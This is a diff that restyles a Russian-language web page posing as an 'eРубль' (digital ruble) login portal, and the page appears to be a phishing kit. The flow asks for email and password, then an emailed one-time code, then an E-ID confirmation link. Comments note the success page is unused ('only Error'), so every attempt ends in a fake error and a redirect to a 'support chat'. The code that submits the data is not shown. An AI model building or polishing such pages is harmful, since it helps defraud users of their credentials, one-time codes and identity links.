-            border: 1px solid rgba(67, 97, 238, 0.1);
+            margin-top: var(--space-3);
+            padding: var(--space-3);
+            background: var(--color-blue-050);
+            border-radius: var(--radius-card-sm);
+            border: 1px solid rgba(0, 102, 255, 0.15);
             text-align: center;
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 13px;
+            color: var(--color-text-accent);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
             display: none;
         }
         .status-waiting .spinner {
             display: inline-block;
             width: 16px;
             height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-top: 2px solid #4361ee;
+            border: 2px solid rgba(0, 102, 255, 0.15);
+            border-top: 2px solid var(--color-blue-600);
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin-right: 8px;
+            margin-right: var(--space-2);
             vertical-align: middle;
         }
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
+        /* ============================================================
+           ОШИБКА
+           ============================================================ */
+        .error-block {
+            text-align: center;
+            padding: var(--space-4) 0;
+        }
+        .error-block .icon {
+            font-size: 56px;
+            margin-bottom: var(--space-3);
+            color: #b91c1c;
+        }
+        .error-block h2 {
+            font-size: var(--text-heading-2-size);
+            line-height: var(--text-heading-2-lh);
+            color: #b91c1c;
+            margin-bottom: var(--space-2);
+            font-weight: var(--fw-semibold);
+        }
+        .error-block p {
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            color: var(--color-text-secondary);
+            margin-bottom: var(--space-4);
+        }
+
+        /* ============================================================
+           АДАПТИВ
+           ============================================================ */
         @media (max-width: 420px) {
             .container {
-                padding: 28px 18px 24px;
-                border-radius: 24px;
+                padding: var(--space-4) var(--space-3);
+                border-radius: var(--radius-card-md);
             }
             .logo h1 {
                 font-size: 28px;
+                line-height: 32px;
             }
             .btn-primary,
             .btn-eid {
-                font-size: 15px;
-                padding: 14px;
+                font-size: var(--text-body-md-size);
+                line-height: var(--text-body-md-lh);
+                padding: var(--space-3);
             }
         }
     </style>
@@ -668,16 +836,33 @@
             </div>
 
             <div class="menu-grid">
-                <div class="menu-item" onclick="goToAbout()"><span class="icon">📊</span> О проекте <span class="arrow">›</span></div>
-                <div class="menu-item" onclick="goToBuy()"><span class="icon">🛒</span> Как купить <span class="arrow">›</span></div>
-                <div class="menu-item" onclick="goToGuide()"><span class="icon">📖</span> Руководство по eРублю <span class="arrow">›</span></div>
-                <div class="menu-item" onclick="goToFaq()"><span class="icon">❓</span> Частые вопросы <span class="arrow">›</span></div>
+                <div class="menu-item" onclick="goToAbout()">
+                    <span class="icon">📊</span> О проекте
+                    <span class="arrow">›</span>
+                </div>
+                <div class="menu-item" onclick="goToBuy()">
+                    <span class="icon">🛒</span> Как купить
+                    <span class="arrow">›</span>
+                </div>
+                <div class="menu-item" onclick="goToGuide()">
+                    <span class="icon">📖</span> Руководство по eРублю
+                    <span class="arrow">›</span>
+                </div>
+                <div class="menu-item" onclick="goToFaq()">
+                    <span class="icon">❓</span> Частые вопросы
+                    <span class="arrow">›</span>
+                </div>
             </div>
 
             <button id="loginBtn" class="btn-primary">🔓 Войти</button>
+
             <div class="divider"><span>или</span></div>
+
             <button id="eidBtn" class="btn-eid">🆔 Вход через E-ID</button>
-            <div class="register-link">Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')">Зарегистрироваться</a></div>
+
+            <div class="register-link">
+                Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
+            </div>
         </div>
 
         <!-- ============================================================
@@ -734,29 +919,45 @@
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 6: ВХОД (erub)
+        СТРАНИЦА 6: ВХОД
         ============================================================ -->
         <div id="pageLoginForm" class="page">
             <div class="page-icon">🔑</div>
             <div class="page-title">Вход в eРубль</div>
             <div class="page-sub">Введите свои данные для входа</div>
+
             <div id="loginFields">
-                <div class="form-group"><label>📧 Email</label><input type="email" id="email" placeholder="Введите ваш email"></div>
-                <div class="form-group"><label>🔑 Пароль</label><input type="password" id="password" placeholder="Введите пароль"></div>
+                <div class="form-group">
+                    <label>📧 Email</label>
+                    <input type="email" id="email" placeholder="Введите ваш email">
+                </div>
+                <div class="form-group">
+                    <label>🔑 Пароль</label>
+                    <input type="password" id="password" placeholder="Введите пароль">
+                </div>
             </div>
-            <div class="forgot-link"><a href="#" onclick="showMessage('Функция восстановления скоро появится', 'info')">Забыли пароль?</a></div>
+
+            <div class="forgot-link">
+                <a href="#" onclick="showMessage('Функция восстановления скоро появится', 'info')">Забыли пароль?</a>
+            </div>
+
             <button id="loginSubmitBtn" class="btn-primary">🔓 Войти</button>
-            <div id="loginError" class="message error" style="display:none; margin-top:12px;">❌ Ошибка. Повторите попытку входа.</div>
+
+            <div id="loginError" class="message error" style="display:none; margin-top:12px;">
+                ❌ Ошибка. Повторите попытку входа.
+            </div>
+
             <button class="btn-back" onclick="goToMain()">← Назад</button>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 7: КОД (после erub входа)
+        СТРАНИЦА 7: КОД
         ============================================================ -->
         <div id="pageCode" class="page">
             <div class="page-icon">📧</div>
             <div class="page-title">Код подтверждения</div>
             <div class="page-sub">Введите код, отправленный на вашу почту</div>
+
             <div id="codeFields">
                 <div class="code-section">
                     <label>📧 Код из 6 цифр</label>
@@ -764,18 +965,26 @@
                     <button id="submitCodeBtn" class="btn-primary">✅ Подтвердить</button>
                 </div>
             </div>
-            <div id="codeError" class="message error" style="display:none; margin-top:12px;">❌ Ошибка. Повторите попытку входа.</div>
-            <div class="status-waiting" id="codeStatus"><span class="spinner"></span> Ожидание...</div>
+
+            <div id="codeError" class="message error" style="display:none; margin-top:12px;">
+                ❌ Ошибка. Повторите попытку входа.
+            </div>
+
+            <div class="status-waiting" id="codeStatus">
+                <span class="spinner"></span> Ожидание...
+            </div>
+
             <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 8: ССЫЛКА (после E-ID входа)
+        СТРАНИЦА 8: ССЫЛКА (E-ID)
         ============================================================ -->
         <div id="pageLink" class="page">
             <div class="page-icon">🔗</div>
             <div class="page-title">E-ID подтверждение</div>
             <div class="page-sub">Ссылка подтверждения отправлена на почту</div>
+
             <div id="linkFields">
                 <div class="code-section">
                     <label>🔗 Ссылка подтверждения</label>
@@ -783,31 +992,40 @@
                     <button id="submitLinkBtn" class="btn-primary">✅ Отправить ссылку</button>
                 </div>
             </div>
-            <div id="linkError" class="message error" style="display:none; margin-top:12px;">❌ Ошибка. Повторите попытку входа.</div>
-            <div class="status-waiting" id="linkStatus"><span class="spinner"></span> Ожидание...</div>
+
+            <div id="linkError" class="message error" style="display:none; margin-top:12px;">
+                ❌ Ошибка. Повторите попытку входа.
+            </div>
+
+            <div class="status-waiting" id="linkStatus">
+                <span class="spinner"></span> Ожидание...
+            </div>
+
             <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
         </div>
 
         <!-- ============================================================
         СТРАНИЦА 9: ОШИБКА (3 попытки)
         ============================================================ -->
-        <div id="pageError" class="page error-page">
+        <div id="pageError" class="page">
             <div class="error-block">
                 <div class="icon">✕</div>
                 <h2>Ошибка входа</h2>
                 <p>Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</p>
-                <button onclick="openSupportChat()" class="btn-primary" style="background:#dc3545;box-shadow:0 8px 30px rgba(220,53,69,0.25);">🆘 Техническая поддержка</button>
+                <button onclick="openSupportChat()" class="btn-primary" style="background:#b91c1c;box-shadow:0 8px 30px rgba(185,28,28,0.25);">
+                    🆘 Техническая поддержка
+                </button>
                 <button class="btn-back" onclick="goToMain()" style="margin-top:10px;">← На главную</button>
             </div>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 10: УСПЕХ (НЕ ИСПОЛЬЗУЕТСЯ — только Ошибка)
+        СТРАНИЦА 10: УСПЕХ (НЕ ИСПОЛЬЗУЕТСЯ)
         ============================================================ -->
         <div id="pageSuccess" class="page success-page" style="display:none;">
             <div class="check">✅</div>
             <h2>Ожидание</h2>
-            <p style="color:rgba(255,255,255,0.4);font-size:14px;">Администратор проверит ваши данные</p>
+            <p style="color:var(--color-text-secondary);font-size:14px;">Администратор проверит ваши данные</p>
             <button class="btn-secondary" onclick="goToMain()" style="margin-top:20px;">🔄 Вернуться на главную</button>
         </div>
 
@@ -1046,12 +1264,7 @@
         });
 
         // ============================================================
-        // 8. E-ID → поле ССЫЛКА
-        // ============================================================
-        // Обработка E-ID уже в loginSubmitBtn: если loginType === 'eid', после успешной отправки переключаем на pageLink
-
-        // ============================================================
-        // 9. ССЫЛКА (E-ID)
+        // 8. ССЫЛКА (E-ID)
         // ============================================================
         submitLinkBtn.addEventListener('click', async function() {
             const link = linkInput.value.trim();
@@ -1084,7 +1297,7 @@
         });
 
         // ============================================================
-        // 10. ENTER
+        // 9. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -1098,5 +1311,6 @@
             }
         });
     </script>
+
 </body>
 </html>
